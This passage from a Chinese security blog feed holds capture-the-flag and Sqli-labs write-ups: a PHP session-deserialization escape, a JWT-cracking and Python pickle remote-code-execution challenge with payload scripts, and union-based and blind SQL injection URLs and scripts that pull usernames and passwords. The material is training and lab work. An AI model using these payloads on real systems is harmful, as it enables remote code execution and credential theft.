class=\"hljs-variable\">$_SESSION</span>[<span class=\"hljs-string\">&#x27;function&#x27;</span>] = <span class=\"hljs-variable\">$function</span>;<br><br>extract(<span class=\"hljs-variable\">$_POST</span>);<br><br><span class=\"hljs-keyword\">if</span>(!<span class=\"hljs-variable\">$function</span>)&#123;<br>    <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">&#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;</span>;<br>&#125;<br><br><span class=\"hljs-keyword\">if</span>(!<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">&#x27;img_path&#x27;</span>])&#123;<br>    <span class=\"hljs-variable\">$_SESSION</span>[<span class=\"hljs-string\">&#x27;img&#x27;</span>] = base64_encode(<span class=\"hljs-string\">&#x27;guest_img.png&#x27;</span>);<br>&#125;<span class=\"hljs-keyword\">else</span>&#123;<br>    <span class=\"hljs-variable\">$_SESSION</span>[<span class=\"hljs-string\">&#x27;img&#x27;</span>] = sha1(base64_encode(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">&#x27;img_path&#x27;</span>]));<br>&#125;<br><br><span class=\"hljs-variable\">$serialize_info</span> = filter(serialize(<span class=\"hljs-variable\">$_SESSION</span>));<br><br><span class=\"hljs-keyword\">if</span>(<span class=\"hljs-variable\">$function</span> == <span class=\"hljs-string\">&#x27;highlight_file&#x27;</span>)&#123;<br>    highlight_file(<span class=\"hljs-string\">&#x27;index.php&#x27;</span>);<br>&#125;<span class=\"hljs-keyword\">else</span> <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-variable\">$function</span> == <span class=\"hljs-string\">&#x27;phpinfo&#x27;</span>)&#123;<br>    <span class=\"hljs-keyword\">eval</span>(<span class=\"hljs-string\">&#x27;phpinfo();&#x27;</span>); <span class=\"hljs-comment\">//maybe you can find something in here!</span><br>&#125;<span class=\"hljs-keyword\">else</span> <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-variable\">$function</span> == <span class=\"hljs-string\">&#x27;show_image&#x27;</span>)&#123;<br>    <span class=\"hljs-variable\">$userinfo</span> = unserialize(<span class=\"hljs-variable\">$serialize_info</span>);<br>    <span class=\"hljs-keyword\">echo</span> file_get_contents(base64_decode(<span class=\"hljs-variable\">$userinfo</span>[<span class=\"hljs-string\">&#x27;img&#x27;</span>]));<br>&#125; <br></code></pre></td></tr></table></figure></li>\n<li><p>给出了phpinfo并且提示里面有内容，看到<code>d0g3_f1ag.php</code></p>\n</li>\n<li><p>看到反序列化session，盲猜应该是session.upload_progress的题目，然后filter函数应该是是利用字符逃逸</p>\n</li>\n<li><p>有一个<code>extract($_POST);</code>，当我们POST一个_SESSION变量之后，就会覆盖SESSION，这里就是可控点</p>\n</li>\n<li><p>接下来就是如何字符逃逸。我们需要构造出来的session是</p>\n<figure class=\"highlight apache\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs apache\"><span class=\"hljs-attribute\">_SESSION</span>[user]=<br><span class=\"hljs-attribute\">flagphpphpflagphp</span>&amp;_SESSION[exp]=;s:<span class=\"hljs-number\">3</span>:<span class=\"hljs-string\">&quot;img&quot;</span>;s:<span class=\"hljs-number\">20</span>:<span class=\"hljs-string\">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;s:<span class=\"hljs-number\">3</span>:<span class=\"hljs-string\">&quot;exp&quot;</span>;s:<span class=\"hljs-number\">2</span>:<span class=\"hljs-string\">&quot;a&quot;</span>&amp;_SESSION[function]=flagflagflagflagflagflagflagflagphpphp<br></code></pre></td></tr></table></figure></li>\n<li><p>拿到d0g3_f1ag.php源码：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span><br><span class=\"hljs-variable\">$flag</span> = <span class=\"hljs-string\">&#x27;flag in /d0g3_fllllllag&#x27;</span>;<br><span class=\"hljs-meta\">?&gt;</span><br></code></pre></td></tr></table></figure></li>\n<li><p>发现文件名经过base64编码后长度不变，改一下就好，拿到flag</p>\n</li>\n</ol>\n<h2 id=\"安洵杯-2019-easy-serialize-php-1\"><a href=\"#安洵杯-2019-easy-serialize-php-1\" class=\"headerlink\" title=\"[安洵杯 2019]easy_serialize_php\"></a>[安洵杯 2019]easy_serialize_php</h2><ol>\n<li><p>提示找到”lv6”，用脚本跑，在第181页</p>\n</li>\n<li><p>买不起，改折扣，提示<code>b1g_m4mber</code></p>\n</li>\n<li><p>提示只能admin访问，有JWT</p>\n</li>\n<li><p><a href=\"https://github.com/brendan-rius/c-jwt-cracker\">https://github.com/brendan-rius/c-jwt-cracker</a>  用这个工具跑   密钥是<code>1Kun</code></p>\n</li>\n<li><p>用<a href=\"https://jwt.io/#encoded-jwt%E4%BF%AE%E6%94%B9%EF%BC%8C%E6%8B%BF%E5%88%B0%E4%BF%AE%E6%94%B9%E5%90%8E%E7%9A%84JWT%EF%BC%8C%E8%AE%BF%E9%97%AE%E6%8B%BF%E5%88%B0%E6%8F%90%E7%A4%BA%60/static/asd1f654e683wq/www.zip%60\">https://jwt.io/#encoded-jwt修改，拿到修改后的JWT，访问拿到提示`/static/asd1f654e683wq/www.zip`</a></p>\n</li>\n<li><p>源码中Admin.py有一个pickle触发点</p>\n</li>\n<li><p>payload：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">import</span> marshal<br><span class=\"hljs-keyword\">import</span> base64<br><span class=\"hljs-keyword\">import</span> urllib<br><br><br><span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">foo</span>():</span><br>    <span class=\"hljs-keyword\">import</span> commands<br>    output = commands.getstatusoutput(<span class=\"hljs-string\">&#x27;cat /flag.txt&#x27;</span>)<br>    <span class=\"hljs-keyword\">return</span> output<br><br>payload = <span class=\"hljs-string\">&quot;&quot;&quot;ctypes</span><br><span class=\"hljs-string\">FunctionType</span><br><span class=\"hljs-string\">(cmarshal</span><br><span class=\"hljs-string\">loads</span><br><span class=\"hljs-string\">(cbase64</span><br><span class=\"hljs-string\">b64decode</span><br><span class=\"hljs-string\">(S&#x27;%s&#x27;</span><br><span class=\"hljs-string\">tRtRc__builtin__</span><br><span class=\"hljs-string\">globals</span><br><span class=\"hljs-string\">(tRS&#x27;&#x27;</span><br><span class=\"hljs-string\">tR(tR.&quot;&quot;&quot;</span> % base64.b64encode(marshal.dumps(foo.func_code))<br><br><br>payload = urllib.quote(payload)<br><span class=\"hljs-built_in\">print</span> payload<br></code></pre></td></tr></table></figure>\n\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs python\">网上版本<br><br><span class=\"hljs-keyword\">import</span> pickle<br><span class=\"hljs-keyword\">import</span> urllib<br><br><span class=\"hljs-class\"><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title\">A</span>(<span class=\"hljs-params\"><span class=\"hljs-built_in\">object</span></span>):</span><br>    <span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">__reduce__</span>(<span class=\"hljs-params\">self</span>):</span><br>        a = <span class=\"hljs-string\">&quot;open(&#x27;/flag.txt&#x27;,&#x27;r&#x27;).read()&quot;</span><br>        <span class=\"hljs-keyword\">return</span> (<span class=\"hljs-built_in\">eval</span>,(a,))<br>a = A()<br>test = pickle.dumps(a)<br>payload = urllib.quote(test)<br><span class=\"hljs-built_in\">print</span> payload<br></code></pre></td></tr></table></figure></li>\n</ol>\n",
            "tags": []
        },
        {
            "id": "http://blog.m1n.me/2019/10/12/Sqli-labs/",
            "url": "http://blog.m1n.me/2019/10/12/Sqli-labs/",
            "title": "Sqli-labs",
            "date_published": "2019-10-12T02:48:24.000Z",
            "content_html": "<h1 id=\"注入语句备忘\"><a href=\"#注入语句备忘\" class=\"headerlink\" title=\"注入语句备忘\"></a>注入语句备忘</h1><ol>\n<li>查库名：<code>select schema_name from information_schema.schemata</code></li>\n<li>查表名：<code>select table_name from information_schema.tables where table_schema=&#39;库名&#39;</code></li>\n<li>查列名：<code>select column_name from information_schema.columns where table_name=&#39;表名&#39;</code></li>\n<li>查数据：<code>select 列名 from 库名.表名</code><span id=\"more\"></span>\n<h1 id=\"注意\"><a href=\"#注意\" class=\"headerlink\" title=\"注意\"></a>注意</h1></li>\n<li>可将用引号包含的库名，表名转换为十六进制，避免引号被过滤</li>\n<li>数据过多时可以利用limit限制数据数量</li>\n<li>同上也可以用<code>concat</code>链接多个数据成为一条返回结果</li>\n<li>…</li>\n</ol>\n<h1 id=\"注入类型判断小技巧\"><a href=\"#注入类型判断小技巧\" class=\"headerlink\" title=\"注入类型判断小技巧\"></a>注入类型判断小技巧</h1><p>1和1”正常回显，1’报错，判断为字符型，但是还要判断是否有小括号。</p>\n<p>判断小括号有几种方法：</p>\n<ol>\n<li>2’&amp;&amp;’1’=’1<ul>\n<li>若查询语句为where id=’$id’，查询时是where id=’2’&amp;&amp;’1’=’1’，结果是where id=’2’，回显会是id=2。</li>\n<li>若查询语句为where id=(‘$id’)，查询时是where id=(‘2’&amp;&amp;’1’=’1’)，MySQL 将’2’作为了 Bool 值，结果是where id=(‘1’)，回显会是id=1。</li>\n</ul>\n</li>\n<li>1’)||’1’=(‘1<br>若查询语句有小括号正确回显，若无小括号错误回显（无回显）。</li>\n</ol>\n<h1 id=\"sqli-labs测试\"><a href=\"#sqli-labs测试\" class=\"headerlink\" title=\"sqli-labs测试\"></a>sqli-labs测试</h1><h2 id=\"Less-1\"><a href=\"#Less-1\" class=\"headerlink\" title=\"Less-1\"></a>Less-1</h2><ol>\n<li>构造<code>127.0.0.1/Less-1/?id=1</code>成功返回数据</li>\n<li>构造<code>127.0.0.1/Less-1/?id=1&#39;</code>出现报错说明存在注入点</li>\n<li>构造<code>127.0.0.1/Less-1/?id=1&#39; order by 3--+</code>测试有几列</li>\n<li>构造<code>127.0.0.1/Less-1/?id=-1&#39; union select 1,2,3--+</code>查看回显点//此时需要令查询的id不存在<br><img src=\"https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%86%85%E5%AE%B9/Sqli-labs/1.png\" alt=\"sql\"></li>\n<li>构造<code>127.0.0.1/Less-1/?id=-1&#39; union select 1,2,(select schema_name from information_schema.schemata)--+</code>查询数据库名。发现报错说数据过多，此时就可以利用limit构造：<code>127.0.0.1/Less-1/?id=-1&#39; union select 1,2,(select schema_name from information_schema.schemata limit 0,1)--+</code>依次进行查看。<br><img src=\"https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%86%85%E5%AE%B9/Sqli-labs/2.png\" alt=\"sql\"><br>或者可以利用<code>group_concat</code>构造：<code>?id=-1&#39; union select 1,2,(select group_concat(schema_name) from information_schema.schemata)--+</code><br><img src=\"https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%86%85%E5%AE%B9/Sqli-labs/3.png\" alt=\"sql\"></li>\n<li>构造：<code>127.0.0.1/Less-1/?id=-1&#39; union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;)--+</code>查询表名<br>此时‘security’可以用十六进制替换，或者用database()<br><img src=\"https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%86%85%E5%AE%B9/Sqli-labs/4.png\" alt=\"sql\"></li>\n<li>构造：<code>127.0.0.1/Less-1/?id=-1&#39; union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;)--+</code>查询段名<br><img src=\"https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%86%85%E5%AE%B9/Sqli-labs/5.png\" alt=\"sql\"></li>\n<li>构造：<code>?id=-1&#39; union select 1,2,(select concat_ws(0x7e,username,password) from security.users limit 0,1)--+</code>查询数据<br><img src=\"https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%86%85%E5%AE%B9/Sqli-labs/6.png\" alt=\"sql\"><br>也可以构造：<code>?id=-1&#39; union select 1,2,(select group_concat(username,0x7e,password) from security.users)--+</code>查询数据<br><img src=\"https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%86%85%E5%AE%B9/Sqli-labs/7.png\" alt=\"sql\"></li>\n</ol>\n<p>至此，sqli-labs的第一关就算是结束了</p>\n<h2 id=\"Less-2\"><a href=\"#Less-2\" class=\"headerlink\" title=\"Less-2\"></a>Less-2</h2><p>这一关总体和第一关是一样的，只是这里是整型注入，因此不用单引号去闭合，其余操作和第一关相同</p>\n<h2 id=\"Less-3\"><a href=\"#Less-3\" class=\"headerlink\" title=\"Less-3\"></a>Less-3</h2><p>这一关是利用<code>&#39;)</code>来闭合</p>\n<h2 id=\"Less-4\"><a href=\"#Less-4\" class=\"headerlink\" title=\"Less-4\"></a>Less-4</h2><p>这一关是利用<code>&quot;)</code>来闭合</p>\n<h2 id=\"Less-5\"><a href=\"#Less-5\" class=\"headerlink\" title=\"Less-5\"></a>Less-5</h2><p>这关开始就是盲注了，并且通过判断可以得知这是布尔盲注<br>直接丢出脚本：</p>\n<figure class=\"highlight n1ql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs n1ql\">import requests<br>import time<br><br>url = &quot;http://47.96.233.216:8080/Less-5/?id=1&#x27;&quot;<br><br>test = &quot;<span class=\"hljs-keyword\">select</span> <span class=\"hljs-keyword\">database</span>()<span class=\"hljs-string\">&quot;</span><br><span class=\"hljs-string\"></span><br><span class=\"hljs-string\">schema = &quot;</span><span class=\"hljs-keyword\">select</span> schema_name <span class=\"hljs-keyword\">from</span> information_schema.schemata <span class=\"hljs-keyword\">limit</span> <span class=\"hljs-number\">0</span>,<span class=\"hljs-number\">1</span><span class=\"hljs-string\">&quot;</span><br><span class=\"hljs-string\"></span><br><span class=\"hljs-string\">table = &quot;</span><span class=\"hljs-keyword\">select</span> table_name <span class=\"hljs-keyword\">from</span> information_schema.tables <span class=\"hljs-keyword\">where</span> table_schema=<span class=\"hljs-keyword\">database</span>() <span class=\"hljs-keyword\">limit</span> <span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">1</span><span class=\"hljs-string\">&quot;</span><br><span class=\"hljs-string\"></span><br><span class=\"hljs-string\">column = &quot;</span><span class=\"hljs-keyword\">select</span> column_name <span class=\"hljs-keyword\">from</span> information_schema.columns <span class=\"hljs-keyword\">where</span> table_name=<span class=\"hljs-string\">&#x27;users&#x27;</span> <span class=\"hljs-keyword\">limit</span> <span class=\"hljs-number\">0</span>,<span class=\"hljs-number\">1</span><span class=\"hljs-string\">&quot;</span><br><span class=\"hljs-string\"></span><br><span class=\"hljs-string\">data = &quot;</span><span class=\"hljs-keyword\">select</span> concat_ws(<span class=\"hljs-number\">0x5e</span>,username,<span class=\"hljs-keyword\">password</span>) <span class=\"hljs-keyword\">from</span> security.users <span class=\"hljs-keyword\">limit</span> <span class=\"hljs-number\">0</span>,<span class=\"hljs-number\">1</span><span class=\"hljs-string\">&quot;</span><br><span class=\"hljs-string\"></span><br><span class=\"hljs-string\">result = &quot;</span><span class=\"hljs-string\">&quot;</span><br><span class=\"hljs-string\"></span><br><span class=\"hljs-string\">for i in range(1,10):</span><br><span class=\"hljs-string\">\tfor j in range(48,122):</span><br><span class=\"hljs-string\">\t\tpayload = url + &quot;</span> <span class=\"hljs-keyword\">and</span> ascii(<span class=\"hljs-built_in\">substr</span>((&#123;&#125;),&#123;&#125;,<span class=\"hljs-number\">1</span>))=&#123;&#125;--+<span class=\"hljs-string\">&quot;.format(data,i,j)</span><br><span class=\"hljs-string\">\t\t# print(payload)</span><br><span class=\"hljs-string\">\t\tr = requests.get(payload)</span><br><span class=\"hljs-string\">\t\tl = len(r.text)</span><br><span class=\"hljs-string\">\t\t# print(l)</span><br><span class=\"hljs-string\">\t\tif(l==704):</span><br><span class=\"hljs-string\">\t\t\tresult+=chr(j)</span><br><span class=\"hljs-string\">\t\t\tprint(result)</span><br><span class=\"hljs-string\">\t\t\tbreak</span><br><span class=\"hljs-string\"></span><br></code></pre></td></tr></table></figure>\n<p>这个脚本还是比较偏向手动化的。。。。</p>\n<h2 id=\"Less-6\"><a href=\"#Less-6\" class=\"headerlink\" title=\"Less-6\"></a>Less-6</h2><p>用<code>&quot;</code>闭合</p>\n<h2 id=\"Less-7\"><a href=\"#Less-7\" class=\"headerlink\" title=\"Less-7\"></a>Less-7</h2><p>用<code>&#39;))</code>闭合，但是此时的设定是无论是否正确，返回的数据长度是一样的。此时改变判断方式：</p>\n<figure class=\"highlight n1ql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs n1ql\">import requests<br><br>url = &quot;http://47.96.233.216:8080/Less-7/?id=1&#x27;))&quot;<br><br>test = &quot;<span class=\"hljs-keyword\">select</span> <span class=\"hljs-keyword\">database</span>()<span class=\"hljs-string\">&quot;</span><br><span class=\"hljs-string\"></span><br><span class=\"hljs-string\">schema = &quot;</span><span class=\"hljs-keyword\">select</span> schema_name <span class=\"hljs-keyword\">from</span> information_schema.schemata <span class=\"hljs-keyword\">limit</span> <span class=\"hljs-number\">0</span>,<span class=\"hljs-number\">1</span><span class=\"hljs-string\">&quot;</span><br><span class=\"hljs-string\"></span><br><span class=\"hljs-string\">table = &quot;</span><span class=\"hljs-keyword\">select</span> table_name <span class=\"hljs-keyword\">from</span> information_schema.tables <span class=\"hljs-keyword\">where</span> table_schema=<span class=\"hljs-keyword\">database</span>() <span class=\"hljs-keyword\">limit</span> <span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">1</span><span class=\"hljs-string\">&quot;</span><br><span class=\"hljs-string\"></span><br><span class=\"hljs-string\">column = &quot;</span><span class=\"hljs-keyword\">select</span> column_name <span class=\"hljs-keyword\">from</span> information_schema.columns <span class=\"hljs-keyword\">where</span> table_name=<span class=\"hljs-string\">&#x27;users&#x27;</span> <span class=\"hljs-keyword\">limit</span> <span class=\"hljs-number\">0</span>,<span class=\"hljs-number\">1</span><span class=\"hljs-string\">&quot;</span><br><span class=\"hljs-string\"></span><br><span class=\"hljs-string\">data = &quot;</span><span class=\"hljs-keyword\">select</span> concat_ws(<span class=\"hljs-number\">0x5e</span>,username,<span class=\"hljs-keyword\">password</span>) <span class=\"hljs-keyword\">from</span> security.users <span class=\"hljs-keyword\">limit</span> <span class=\"hljs-number\">0</span>,<span class=\"hljs-number\">1</span><span class=\"hljs-string\">&quot;</span><br><span class=\"hljs-string\"></span><br><span class=\"hljs-string\">result = &quot;</span><span class=\"hljs-string\">&quot;</span><br><span class=\"hljs-string\"></span><br><span class=\"hljs-string\">for i in range(1,10):</span><br><span class=\"hljs-string\">\tfor j in range(48,122):</span><br><span class=\"hljs-string\">\t\tpayload = url + &quot;</span> <span class=\"hljs-keyword\">and</span> ascii(<span class=\"hljs-built_in\">substr</span>((&#123;&#125;),&#123;&#125;,<span class=\"hljs-number\">1</span>))=&#123;&#125;--+<span class=\"hljs-string\">&quot;.format(test,i,j)</span><br><span class=\"hljs-string\">\t\tr = requests.get(payload)</span><br><span class=\"hljs-string\">\t\ttxt = r.text</span><br><span class=\"hljs-string\">\t\tl = len(r.text)</span><br><span class=\"hljs-string\">\t\ts = &quot;</span>You are <span class=\"hljs-keyword\">in</span>.... <span class=\"hljs-keyword\">Use</span> outfile......<span class=\"hljs-string\">&quot;</span><br><span class=\"hljs-string\">\t\tif(s in txt):</span><br><span class=\"hljs-string\">\t\t\tresult+=chr(j)</span><br><span class=\"hljs-string\">\t\t\tprint(result)</span><br><span class=\"hljs-string\">\t\t\tbreak</span><br><span class=\"hljs-string\"></span><br></code></pre></td></tr></table></figure>\n<h2 id=\"Less-8\"><a href=\"#Less-8\" class=\"headerlink\" title=\"Less-8\"></a>Less-8</h2><p>这一关的闭合方式还是单引号，而且好像和第五关没啥差别？？？只要改一下返回数据长度脚本一样是可以用的？？</p>\n<h2 id=\"Less-9\"><a href=\"#Less-9\" class=\"headerlink\" title=\"Less-9\"></a>Less-9</h2><p>通过测试我们可以发现无论所查询的数据是否存在，都会返回”You are in….“，可以推断这次不是布尔盲注而是时间盲注。丢出时间盲注的脚本：</p>\n<figure class=\"highlight n1ql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs n1ql\">import requests<br>import time<br><br>url = &quot;http://47.96.233.216:8080/Less-9/?id=1&#x27;&quot;<br><br>test = &quot;<span class=\"hljs-keyword\">select</span> <span class=\"hljs-keyword\">database</span>()<span class=\"hljs-string\">&quot;</span><br><span class=\"hljs-string\"></span><br><span class=\"hljs-string\">schema = &quot;</span><span class=\"hljs-keyword\">select</span> schema_name <span class=\"hljs-keyword\">from</span> information_schema.schemata <span class=\"hljs-keyword\">limit</span> <span class=\"hljs-number\">0</span>,<span class=\"hljs-number\">1</span><span class=\"hljs-string\">&quot;</span><br><span class=\"hljs-string\"></span><br><span class=\"hljs-string\">table = &quot;</span><span class=\"hljs-keyword\">select</span> table_name <span class=\"hljs-keyword\">from</span> information_schema.tables <span class=\"hljs-keyword\">where</span> table_schema=<span class=\"hljs-keyword\">database</span>() <span class=\"hljs-keyword\">limit</span> <span class=\"hljs-number\">0</span>,<span class=\"hljs-number\">1</span><span class=\"hljs-string\">&quot;</span><br><span class=\"hljs-string\"></span><br><span class=\"hljs-string\">column = &quot;</span><span class=\"hljs-keyword\">select</span> column_name <span class=\"hljs-keyword\">from</span> information_schema.columns <span class=\"hljs-keyword\">where</span> table_name=<span class=\"hljs-string\">&#x27;users&#x27;</span> <span class=\"hljs-keyword\">limit</span> <span class=\"hljs-number\">0</span>,<span class=\"hljs-number\">1</span><span class=\"hljs-string\">&quot;</span><br><span class=\"hljs-string\"></span><br><span class=\"hljs-string\">data = &quot;</span><span class=\"hljs-keyword\">select</span> concat_ws(<span class=\"hljs-number\">0x5e</span>,username,<span class=\"hljs-keyword\">password</span>) <span class=\"hljs-keyword\">from</span> security.users <span class=\"hljs-keyword\">limit</span> <span class=\"hljs-number\">0</span>,<span class=\"hljs-number\">1</span><span class=\"hljs-string\">&quot;</span><br><span class=\"hljs-string\"></span><br><span class=\"hljs-string\">result = &quot;</span><span class=\"hljs-string\">&quot;</span><br><span class=\"hljs-string\"></span><br><span class=\"hljs-string\">for i in range(1,10):</span><br><span class=\"hljs-string\">\tfor j in range(48,122):(test,i,j)</span><br><span class=\"hljs-string\">\t\tpayload = url + &quot;</span> <span class=\"hljs-keyword\">and</span> <span class=\"hljs-keyword\">if</span>(ascii(<span class=\"hljs-built_in\">substr</span>((&#123;&#125;),&#123;&#125;,<span class=\"hljs-number\">1</span>))=&#123;&#125;,sleep(<span class=\"hljs-number\">2</span>),<span class=\"hljs-number\">1</span>)--+<span class=\"hljs-string\">&quot;.format(data,i,j)</span><br><span class=\"hljs-string\">\t\tt1 = time.time()</span><br><span class=\"hljs-string\">\t\tr = requests.get(payload)</span><br><span class=\"hljs-string\">\t\tt2 = time.time()</span><br><span class=\"hljs-string\">\t\tif(t2-t1&gt;=2):</span><br><span class=\"hljs-string\">\t\t\tresult+=chr(j)</span><br><span class=\"hljs-string\">\t\t\tprint(result)</span><br><span class=\"hljs-string\">\t\t\tbreak</span><br><span class=\"hljs-string\"></span><br></code></pre></td></tr></table></figure>\n<h2 id=\"Less-10\"><a href=\"#Less-10\" class=\"headerlink\" title=\"Less-10\"></a>Less-10</h2><p>用<code>&quot;</code>闭合</p>\n<h2 id=\"Less-11\"><a href=\"#Less-11\" class=\"headerlink\" title=\"Less-11\"></a>Less-11</h2><p>由于请求方式是post，因此要用BurpSuit抓包，可以发现账号密码处存在注入点<br><img src=\"https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%86%85%E5%AE%B9/Sqli-labs/8.png\" alt=\"sql\"><br>#Less-12<br>同上，用<code>&quot;)</code>闭合<br>#Less-13<br>可以发现页面没有回显，通过返回图片的不同可以发现是bool盲注，而且时间盲注应该是可以的，但是由于返回的数据包不同点是图片不相同，不能通过判断长度进行布尔盲注，可以用<code>if(s in r.txt)</code>进行判断<br>先放一下脚本：</p>\n<figure class=\"highlight nix\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs nix\"><span class=\"hljs-built_in\">import</span> requests<br><br><span class=\"hljs-attr\">url</span> = <span class=\"hljs-string\">&quot;http://47.96.233.216:8080/Less-13/&quot;</span><br><br><span class=\"hljs-attr\">test</span> = <span class=\"hljs-string\">&quot;select database()&quot;</span><br><br><span class=\"hljs-attr\">schema</span> = <span class=\"hljs-string\">&quot;select schema_name from information_schema.schemata limit 0,1&quot;</span><br><br><span class=\"hljs-attr\">table</span> = <span class=\"hljs-string\">&quot;select table_name from information_schema.tables where table_schema=database() limit 1,1&quot;</span><br><br><span class=\"hljs-attr\">column</span> = <span class=\"hljs-string\">&quot;select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1&quot;</span><br><br><span class=\"hljs-attr\">data</span> = <span class=\"hljs-string\">&quot;select concat_ws(0x5e,username,password) from security.users limit 0,1&quot;</span><br><br><span class=\"hljs-attr\">result</span> = <span class=\"hljs-string\">&quot;&quot;</span><br><br>for i <span class=\"hljs-keyword\">in</span> range(<span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">10</span>):<br>\tfor j <span class=\"hljs-keyword\">in</span> 